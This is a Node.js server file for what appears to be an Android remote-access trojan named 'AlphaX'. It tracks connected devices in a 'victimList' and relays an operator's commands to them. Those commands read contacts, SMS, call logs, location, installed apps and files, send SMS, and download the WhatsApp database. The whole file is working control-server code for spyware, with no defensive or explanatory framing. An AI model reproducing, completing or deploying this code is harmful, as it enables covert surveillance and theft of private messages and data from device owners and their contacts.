const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const listener = require('./listener');
const commands = require('./commands');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { maxHttpBufferSize: 1e8 }); // 100MB

app.use(express.static(path.join(__dirname, 'public')));
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

let victimList = {};
let deviceData = {};
let adminSocketId = null;

io.on('connection', socket => {
    socket.on('adminJoin', () => {
        adminSocketId = socket.id;
        Object.keys(deviceData).forEach(id => socket.emit('join', deviceData[id]));
    });

    socket.on('join', device => listener.deviceJoin(device, socket, victimList, deviceData, io));
    socket.on('request', data => commands.request(data, victimList, io));

    ['getDir','getInstalledApps','getContacts','sendSMS','getCallLog','getLocation','previewImage','error','getSMS'].forEach(event => {
        socket.on(event, data => listener.response(event, data, adminSocketId, io));
    });

    socket.on('download', (data, callback) => listener.responseBinary('download', data, callback, adminSocketId, io));
    socket.on('downloadWhatsappDatabase', (data, callback) => listener.responseBinary('downloadWhatsappDatabase', data, callback, adminSocketId, io));

    socket.on('disconnect', () => listener.handleDisconnect(socket, victimList, deviceData, adminSocketId, io));
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => console.log(`AlphaX Server Running on port ${PORT}`));